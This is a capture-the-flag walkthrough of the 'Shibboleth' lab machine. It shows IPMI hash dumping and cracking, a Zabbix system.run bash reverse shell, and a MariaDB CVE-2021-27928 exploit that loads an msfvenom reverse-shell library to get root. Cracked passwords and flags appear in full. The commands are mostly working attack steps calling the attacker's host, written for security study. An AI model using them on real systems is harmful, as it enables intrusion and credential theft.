# Shibboleth

## Enumerating

-> Not found on nmap
````
# nmap -sS -p- 10.10.11.124
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 13:21 EST
Nmap scan report for shibboleth.htb (10.10.11.124)
Host is up (0.16s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
````

-> Not found on gobuster dir, gobuster dns, so we tried goubster vhost

````
root@kali:~/Desktop/shibboleth# gobuster vhost -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u shibboleth.htb --no-error | grep 200
Found: monitor.shibboleth.htb (Status: 200) [Size: 3686]    
Found: monitoring.shibboleth.htb (Status: 200) [Size: 3686]      
Found: zabbix.shibboleth.htb (Status: 200) [Size: 3686]          
Found: 2009.shibboleth.htb (Status: 302) [Size: 291]                          
Found: 2008.shibboleth.htb (Status: 302) [Size: 291]
````

Access Zabbix
`http://zabbix.shibboleth.htb/`

## Enumerating
````
nmap -sU --top-ports 100 zabbix.shibboleth.htb
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-26 15:30 EST
Nmap scan report for zabbix.shibboleth.htb (10.10.11.124)
Host is up (0.16s latency).
rDNS record for 10.10.11.124: shibboleth.htb
Not shown: 99 closed udp ports (port-unreach)
PORT    STATE SERVICE
623/udp open  asf-rmcp
````

Verifying vulnerabilites
````
msf6 auxiliary(scanner/ipmi/ipmi_version) > run

[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - IPMI-2.0 UserAuth(auth_msg, auth_user, non_null_user) PassAuth(password, md5, md2, null) Level(1.5, 2.0) 
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf6 auxiliary(scanner/ipmi/ipmi_cipher_zero) > run

[*] Sending IPMI requests to 10.10.11.124->10.10.11.124 (1 hosts)
[+] 10.10.11.124:623 - IPMI - VULNERABLE: Accepted a session open request for cipher zero
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
````

Dumping database
````
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run

[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:38e5597c82010000583ee46e03e6637885173b7039f59331b8576f9e8519804d99ed7c5f00df090ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:a05e749d9461984cc13f02e8c7810103a7e3d10e
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
````

## Cracking the hash

````
hashcat -h | grep -i ipmi
   7300 | IPMI2 RAKP HMAC-SHA1                                | Network Protocol

hashcat -m 7300 hashes /root/rockyou.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-8750H CPU @ 2.20GHz, 2904/5873 MB (1024 MB allocatable), 1MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /root/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

38e5597c82010000583ee46e03e6637885173b7039f59331b8576f9e8519804d99ed7c5f00df090ea123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:a05e749d9461984cc13f02e8c7810103a7e3d10e:ilovepumkinpie1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 7300 (IPMI2 RAKP HMAC-SHA1)
Hash.Target......: 38e5597c82010000583ee46e03e6637885173b7039f59331b85...e3d10e
Time.Started.....: Sat Feb 26 16:09:53 2022 (6 secs)
Time.Estimated...: Sat Feb 26 16:09:59 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/root/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1254.7 kH/s (0.30ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 7394816/14344385 (51.55%)
Rejected.........: 0/7394816 (0.00%)
Restore.Point....: 7394304/14344385 (51.55%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: ilovequay -> ilovepire
Hardware.Mon.#1..: Util:100%

Started: Sat Feb 26 16:09:49 2022
Stopped: Sat Feb 26 16:10:00 2022

````

Administrator -> ilovepumkinpie1


## Exploiting

### Shell Shoveled back on Zabbix

Configuration > Hosts > Items > New item

````zabbix
system.run[/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.15.6/1337 0>&1",nowait]
````

````shell
root@kali:~/Desktop/shibboleth# rlwrap nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.15.6] from (UNKNOWN) [10.10.11.124] 33844
bash: cannot set terminal process group (884): Inappropriate ioctl for device
bash: no job control in this shell
zabbix@shibboleth:/$ id
id
uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)

````

# User

````shell
su ipmi-svc
Password: ilovepumkinpie1
pwd
/home/ipmi-svc
id

uid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)
ls -lah
total 32K
drwxr-xr-x 3 ipmi-svc ipmi-svc 4.0K Oct 16 12:23 .
drwxr-xr-x 3 root     root     4.0K Oct 16 12:24 ..
lrwxrwxrwx 1 ipmi-svc ipmi-svc    9 Apr 27  2021 .bash_history -> /dev/null
-rw-r--r-- 1 ipmi-svc ipmi-svc  220 Apr 24  2021 .bash_logout
-rw-r--r-- 1 ipmi-svc ipmi-svc 3.7K Apr 24  2021 .bashrc
drwx------ 2 ipmi-svc ipmi-svc 4.0K Apr 27  2021 .cache
lrwxrwxrwx 1 ipmi-svc ipmi-svc    9 Apr 28  2021 .mysql_history -> /dev/null
-rw-r--r-- 1 ipmi-svc ipmi-svc  807 Apr 24  2021 .profile
-rw-r----- 1 ipmi-svc ipmi-svc   33 Feb 26 21:08 user.txt
-rw-rw-r-- 1 ipmi-svc ipmi-svc   22 Apr 24  2021 .vimrc
cat user.txt
25aab26618d0d06d2867aa430dc3c5fc
````

# Root

````shell
$ grep -iR 'password' /etc/zabbix/ 2>/dev/null
/etc/zabbix/zabbix_server.conf.dpkg-dist:### Option: DBPassword
/etc/zabbix/zabbix_server.conf.dpkg-dist:#      Database password.
/etc/zabbix/zabbix_server.conf.dpkg-dist:#      Comment this line if no password is used.
/etc/zabbix/zabbix_server.conf.dpkg-dist:# DBPassword=
/etc/zabbix/zabbix_server.conf:### Option: DBPassword
/etc/zabbix/zabbix_server.conf:#        Database password.
/etc/zabbix/zabbix_server.conf:#        Comment this line if no password is used.
/etc/zabbix/zabbix_server.conf:DBPassword=bloooarskybluh
````
Zabbix DBPassword -> bloooarskybluh

````
$ python3.8 -c "import pty; pty.spawn('/bin/bash')"

$ mysql -u zabbix -p -D zabbix
bloooarskybluh

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 609
Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [zabbix]> 

````
:new: 10.3.25-MariaDB-0ubuntu0.20.04.1 => [CVE-2021-27928](https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html)

````shell
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.15.6 LPORT=7331 -f elf-so -o CVE-2021-27928.so
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf-so file: 476 bytes
Saved as: CVE-2021-27928.so
````

````
$ rlwrap nc -nlvp 7331
````

````
$ python3 -m http.server
$ wget 10.10.15.6:8000/CVE-2021-27928.so -O CVE-2021-27928.so
````

````
$ mysql -u zabbix -p -D zabbix -h 127.0.0.1 -e 'SET GLOBAL wsrep_provider="/tmp/.../CVE-2021-27928.so";'
<LOBAL wsrep_provider="/tmp/.../CVE-2021-27928.so";'
bloooarskybluh

ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query
````

````
root@kali:~/Desktop/shibboleth# rlwrap nc -nlvp 7331
listening on [any] 7331 ...
connect to [10.10.15.6] from (UNKNOWN) [10.10.11.124] 54714
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/var/lib/mysql
cd 
pwd
/var/lib/mysql
cd /root
ls
root.txt
scripts
cat root.txt
6fd689a1e529fe27a6abfcd3861a710e
````

# Secrets

* FLAG_USER = 25aab26618d0d06d2867aa430dc3c5fc
* FLAG_ROOT = 6fd689a1e529fe27a6abfcd3861a710e

